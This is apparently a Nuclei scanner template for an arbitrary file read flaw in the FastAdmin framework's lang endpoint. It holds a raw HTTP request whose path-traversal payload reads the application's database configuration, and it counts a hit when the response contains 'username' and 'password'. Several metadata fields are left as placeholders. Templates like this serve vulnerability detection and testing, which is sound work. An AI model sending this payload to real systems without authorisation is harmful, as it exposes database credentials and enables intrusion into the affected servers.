id: fastadmin-lang-fileread
info:
  name: Template Name
  author: wangzong
  severity: high
  description: FastAdmin 是一款基于PHP+Bootstrap开源后台框架,采用 Apache2 商业友好开源协议,FastAdmin 是专为开发者精心打造的一款开源后台框架,fastAdmin开发框架lang接口存在任意文件读取漏洞。
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |-
        GET /index/ajax/lang?lang=../../application/database HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept: */*
        Connection: Keep-Alive
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - username
      - type: word
        part: body
        words:
          - password
